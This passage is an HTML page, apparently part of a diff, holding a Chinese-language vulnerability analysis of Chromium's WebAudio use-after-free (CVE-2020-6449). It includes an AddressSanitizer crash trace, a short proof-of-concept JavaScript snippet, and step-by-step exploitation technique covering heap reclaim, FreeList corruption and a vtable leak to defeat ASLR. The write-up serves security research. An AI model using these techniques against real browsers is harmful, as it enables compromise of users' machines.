+    #16 0x7ffc663fe30b in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl E:\chromium\80.0.3987.132\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:365
+    #17 0x7ffc663fdaba in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork E:\chromium\80.0.3987.132\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:219
+    #18 0x7ffc663d16a3 in base::MessagePumpDefault::Run E:\chromium\80.0.3987.132\src\base\message_loop\message_pump_default.cc:39
+    #19 0x7ffc66400239 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run E:\chromium\80.0.3987.132\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:463
+    #20 0x7ffc63fa5cbe in base::RunLoop::Run E:\chromium\80.0.3987.132\src\base\run_loop.cc:156
+    #21 0x7ffc65eefc12 in content::RendererMain E:\chromium\80.0.3987.132\src\content\renderer\renderer_main.cc:213
+    #22 0x7ffc63cdbbe5 in content::ContentMainRunnerImpl::Run E:\chromium\80.0.3987.132\src\content\app\content_main_runner_impl.cc:871
+    #23 0x7ffc63d8bf7b in service_manager::Main E:\chromium\80.0.3987.132\src\services\service_manager\embedder\main.cc:423
+    #24 0x7ffc63cd9cea in content::ContentMain E:\chromium\80.0.3987.132\src\content\app\content_main.cc:19
+    #25 0x7ffc5bca1431 in ChromeMain E:\chromium\80.0.3987.132\src\chrome\app\chrome_main.cc:110
+    #26 0x7ff70b6f6697 in MainDllLoader::Launch E:\chromium\80.0.3987.132\src\chrome\app\main_dll_loader_win.cc:203
+    #27 0x7ff70b6f2704 in main E:\chromium\80.0.3987.132\src\chrome\app\chrome_exe_main_win.cc:236
+    #28 0x7ff70ba7096b in __scrt_common_main_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
+    #29 0x7ffcc8717033 in BaseThreadInitThunk+0x13 (C:\WINDOWS\System32\KERNEL32.DLL+0x180017033)
+    #30 0x7ffcc8d22650 in RtlUserThreadStart+0x20 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x180052650)
+
+SUMMARY: AddressSanitizer: heap-use-after-free E:\chromium\80.0.3987.132\src\third_party\blink\renderer\modules\webaudio\audio_node.cc:508 in blink::AudioHandler::BreakConnectionWithLock
+Shadow bytes around the buggy address:
+  0x04747a8725e0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x04747a8725f0: fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa
+  0x04747a872600: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
+  0x04747a872610: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x04747a872620: fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa
+=&gt;0x04747a872630: fd fd fd fd fd fd fd fd fd fd fd fd fd[fd]fd fd
+  0x04747a872640: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa
+  0x04747a872650: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
+  0x04747a872660: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x04747a872670: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
+  0x04747a872680: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+  Shadow gap:              cc
+==9296==ABORTING
+</code></pre>
+    <p>通过对CVE
+      2020-6428的分析，大致就可以弄明白6449的触发原理，由于6428中释放内存与重用内存之前没有可以利用的时间来进行内存回收，而在6449中多了一个步骤那就是在代码运行至BreakConnection函数前就将active_source_handlers_清除，如此即可得到一段可以用于回收内存的时间以便用于漏洞的利用。<br>
+      关于漏洞触发基本与6428类似，此处只对存在差异的释放部分进行分析说明。<br>
+      WebAudio会工作在与渲染线程不同的线程中，而在6449
+      POC中使用了AudioWorkletNode与PannerNode来使Audio线程出现延迟，由于线程延迟导致POC中代码<code>audioCtx.resume();</code>在调用到BreakConnection函数前先去执行<code>parent.remove();</code>该操作会移除iframe破坏其上下文，remove操作最终会去调用ClearHandlersToBeDeleted函数，ClearHandlersToBeDeleted函数会去清空active_source_handlers_列表<br>
+      <img src="https://img-blog.csdnimg.cn/0b9a5c261c324da396fb8618925fc670.png" alt="在这里插入图片描述"><br>
+      <img src="https://img-blog.csdnimg.cn/765212cfa24d4d2e914a06375cd07c8e.png" alt="在这里插入图片描述"><br>
+      而在清空列表的同时也会调用ConstantSourceHandler对象析构函数将ConstantSourceHandler对象也就是在6428漏洞分析中提到保存在finished_source_handler列表中的finished对象释放，导致在finished_source_handler列表中保存了一个已经被释放的悬挂指针。<br>
+      <img src="https://img-blog.csdnimg.cn/777ce02b72004a89b26f589ac368613c.png" alt="在这里插入图片描述"><br>
+      <img src="https://img-blog.csdnimg.cn/8f96ebe0b6844acfba5cbb163dc6c1f3.png" alt="在这里插入图片描述"><br>
+      之后Audio线程处理完AudioWorkletNode与PannerNode后就会通过<code>audioCtx.resume();</code>去调用BreakConnection函数。<br>
+      <img src="https://img-blog.csdnimg.cn/d4eaf69da2674e389f0f0a059cdf4953.png" alt="在这里插入图片描述"><br>
+      由于active_source_handlers_列表已经被清空，所以当调用erase去擦除时finished对象已经不在active_source_handlers_列表中，然后会直接去调用finished成员函数BreakConnectionWithLock，而此时finished已经被释放于是产生UAF。<br>
+      <img src="https://img-blog.csdnimg.cn/4cfacd36f1fa48ec8de16ba6fe7bbf17.png" alt="在这里插入图片描述">
+    </p>
+    <h1><a id="_274"></a>漏洞利用</h1>
+    <h2><a id="PartitionAlloc_275"></a>PartitionAlloc</h2>
+    <p>通过对CVE 2019-13720的分析以及<a
+        href="https://blog.perfect.blue/Chromium-Fullchain">这篇文章</a>大致可以得知一些有关于PartitionAlloc的利用方法，而PartitionAlloc还会将堆内存分为四个分区：
+    </p>
+    <ul>
+      <li>Buffer分区：主要分配变长对象或者是内容可能会被用户脚本篡改的对象，如Vector、HashTable、ArrayBufferContent、String等容器类对象；</li>
+      <li>FastMalloc分区：主要分配除其他三种类型之外的比如被标记为USING_FAST_MALLOC的类对象，Blink中大量功能逻辑的内部对象都归于此分区；</li>
+      <li>Node分区（之前版本叫modelobject分区）：主要分配dom节点对象，通过重写Node.new/delete运算符实现</li>
+      <li>LayoutObject分区：主要分配layou相关对象，如LayoutObject、PaintLayer、双向字体BidiCharacterRun等对象</li>
+    </ul>
+    <p>13720属于Buffer分区中的UAF，而6449则属于FastMalloc分区。<br>
+      然后以ConstantSourceHandler对象释放为例，对PartitionAlloc内存释放的过程进行调试并分析FreeList，通过之前对PartitionAlloc的了解可知，当其在释放内存时会将当前内存链入FreeList链表，并将其下一个空闲内存节点指针逆序后写入当前内存结点头部，于是对要被释放的ConstantSourceHandler对象头部八个字节下写断点，最终在<code>base::internal::PartitionPage::Free</code>函数处断下<br>
+      <img src="https://img-blog.csdnimg.cn/f84af05995d54e5facf9f4a4cd152414.png" alt="在这里插入图片描述"><br>
+      通过对<code>base::internal::PartitionPage::Free</code>函数源码的分析可知，当它在释放内存时会先将当前freelist头部进行编码(通过之前对13720的分析可知编码就是将指针进行逆序排序)，然后将其存入当前指针即ConstantSourceHandler对象(0000476b0432c200)头部八个字节，并将地址0000476b0432c200设为FreeList的头部。<br>
+      <img src="https://img-blog.csdnimg.cn/eb830acb7524432a8b80efd357909266.png" alt="在这里插入图片描述"><br>
+      最后将num_allocated_slots-1，num_allocated_slots为一个标签用于表示页面状态<br>
+      <img src="https://img-blog.csdnimg.cn/b2953e82482d4e51a4ffc9c8417f4fcc.png" alt="在这里插入图片描述"><br>
+      <img src="https://img-blog.csdnimg.cn/d74690d6198d4587a79501e5fa6fe981.png" alt="在这里插入图片描述">
+    </p>
+    <h2><a id="_290"></a>回收内存</h2>
+    <p>在利用其他对象回收内存之前先需要知道被释放的对象大小，通过sizeof得知ConstantSourceHandler对象大小为0xf8(248)字节，必须要找到位于同一桶内的对象来将此内存回收。<br>
+      <img src="https://img-blog.csdnimg.cn/b681742184bb4c74be93294a6a0d366c.png" alt="在这里插入图片描述"><br>
+      但通过CodeQL我并没有找到合适的类，所以只能在linux下使用漏洞提交者提供的利用方法通过BiquadDSPKernel对象进行利用。<br>
+      在linux下ConstantSourceHandler对象大小为0xf0(240)字节，BiquadDSPKernel对象为0xe8(232)字节，而ConstantSourceHandler对象所在的bucket大小范围为0xe1~0xf0<br>
+      <img src="https://img-blog.csdnimg.cn/04482dff7c16431bad5e628dd8f1bccd.png" alt="在这里插入图片描述"><br>
+      随后在创建ConstantSourceNode对象时创建ConstantSourceHandler<br>
+      <img src="https://img-blog.csdnimg.cn/6142601f2b594c18b46ad54efd80e804.png" alt="在这里插入图片描述"><br>
+      之后在remove frame时触发ConstantSourceHandler对象析构操作导致ConstantSourceHandler对象被释放<br>
+      <img src="https://img-blog.csdnimg.cn/e6dc04c21d7b4f189703befe4b534aaa.png" alt="在这里插入图片描述"><br>
+      <img src="https://img-blog.csdnimg.cn/cb7e14d27e604238bcff0c6010c51a69.png" alt="在这里插入图片描述"><br>
+      最后会通过blink::DeferredTaskHandler::BreakConnections函数去调用已经被释放的ConstantSourceHandler对象<br>
+      <img src="https://img-blog.csdnimg.cn/66bc46cd5b1244c2a59b1d74fb620839.png" alt="在这里插入图片描述"><br>
+      <img src="https://img-blog.csdnimg.cn/fb3ae472b50d41548db01805f1352148.png" alt="在这里插入图片描述"><br>
+      <img src="https://img-blog.csdnimg.cn/2ab54db69cf44957a5ebdfebe5fccc5a.png" alt="在这里插入图片描述"><br>
+      在poc中的remove函数中通过调用AudioContext.createBiquadFilter创建BiquadDSPKernel对象
+    </p>
+    <pre><code class="prism language-js"><span class="token keyword">function</span> <span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">let</span> frame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"ifrm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  frame<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">let</span> <span class="token constant">BDP</span> <span class="token operator">=</span> audioCtx_1<span class="token punctuation">.</span><span class="token function">createBiquadFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建BiquadDSPKernel对象</span>
+<span class="token punctuation">}</span>
+</code></pre>
+    <p>当blink::DeferredTaskHandler::BreakConnections函数去调用finished时其实调用的是BiquadDSPKernel对象<br>
+      <img src="https://img-blog.csdnimg.cn/ae92fe12ba5046d1877b85122e3d3f66.png" alt="在这里插入图片描述"><br>
+      <img src="https://img-blog.csdnimg.cn/f26444a4179943e29452e05c0819b8b9.png" alt="在这里插入图片描述"><br>
+      然后对BreakConnectionWithLock函数进行分析。<br>
+      <img src="https://img-blog.csdnimg.cn/ed655a5dbf02446f94a3ac9520a286b5.png" alt="在这里插入图片描述"><br>
+      其中AssertGraphOwner()函数只有在开启DEHECK的时候才会被调用，所以BreakConnectionWithLock函数会先将成员变量connection_ref_count_减一，然后当connection_ref_count_为0时就去调用虚函数DisableOutputsIfNecessary<br>
+      <img src="https://img-blog.csdnimg.cn/4e38d0c7ac0e4c67ba5e315c1e990ecc.png" alt="在这里插入图片描述"><br>
+      通过将finished指针地址解析为BiquadDSPKerne类型，查看其connection_ref_count_所对应的BiquadDSPKerne对象成员变量<br>
+      <img src="https://img-blog.csdnimg.cn/58f9b8ce9bde4559b366b052c6dd77b4.png" alt="在这里插入图片描述"><br>
+      <img src="https://img-blog.csdnimg.cn/1846453d07c04916aa452e144937a504.png" alt="在这里插入图片描述"><br>
+      通过对比发现其正好对应BiquadDSPKerne-&gt;biquad_.a1_.allocation_<br>
+      <img src="https://img-blog.csdnimg.cn/4d99cef3bd414d9b9987417e296e90be.png" alt="在这里插入图片描述">
+    </p>
+    <h2><a id="FreeList_325"></a>损坏FreeList</h2>
+    <p>通过查看源码可知BiquadDSPKerne-&gt;biquad_.a1_为 AudioDoubleArray数组<br>
+      <img src="https://img-blog.csdnimg.cn/3b747add16104ddebbaec27be2a70d36.png" alt="在这里插入图片描述"><br>
+      <img src="https://img-blog.csdnimg.cn/f99dd625fa324e60ac0356519eff2fe3.png" alt="在这里插入图片描述"><br>
+      通过之前的分析以及对a1类型的分析可知，a1为一个有128个元素的double型AudioArray，也就是说其allocation所指向的内存应该位于1024(8*128)字节大小的bucket中，而bucket中的chunk则是线性分布的，也就是说通过漏洞可使a1所在的内存与其在bucket中的前一个依然在使用中的chunk发生重叠，虽然仅重叠一个字节并没有什么用处，但是可以通过反复的释放a1所在的内存使其一直处于FreeList的头部，由于1024字节大小的bucket并不常用不用担心被其他对象回收，所以可以反复的回收该内存并触发漏洞使其指针-1，最后就会使重叠的区域变大。<br>
+      在此处我执行64次<br>
+      <img src="https://img-blog.csdnimg.cn/a1464057d5a748a6939e3a18d15b2172.png" alt="在这里插入图片描述">
+    </p>
+    <h2><a id="_332"></a>信息泄露</h2>
+    <p>
+      经过上一步骤后，FreeList列表的头部就会保存一块与前一个chunk有重叠区域的大小为1024的bucket内存区域，而通过BiquadDSPKerne-&gt;biquad_.a1_回收这块区域后这块区域实际上是被一个AudioArray数组占用，该数组内没有数据所以无法泄露有用的信息，所以想要拿到有用的信息，还需要找到一个位于该bucket中的对象利用该对象回收内存，而HRTFPanner对象正好合适，此对象大小为1080<br>
+      <img src="https://img-blog.csdnimg.cn/c0ac204894f84aa4b3896661b0360b57.png" alt="在这里插入图片描述"><br>
+      通过前面的步骤可使FreeList保存的被破坏的chunk内存指针指向的地址与其前一块还在占用的chunk发生重叠，当创建HRTFPanner对象时这块被被破坏的chunk就会被分配给HRTFPanner对象，而HRTFPanner对象的虚表以及database_loader字段就会被放置在前一个chunk的末尾<br>
+      <img src="https://img-blog.csdnimg.cn/66f3f0453e2741c3a254a32003f0219b.png" alt="在这里插入图片描述"><br>
+      通过HRTFPanner虚表可计算出chrome进程加载基址<br>
+      <img src="https://img-blog.csdnimg.cn/45793acd1025413da2451ce699af475a.png" alt="在这里插入图片描述"><br>
+      <img src="https://img-blog.csdnimg.cn/b53112d72b6e414bb75d128a6a770fa3.png" alt="在这里插入图片描述">
+    </p>
+  </div>
+</body>
+
+</html>
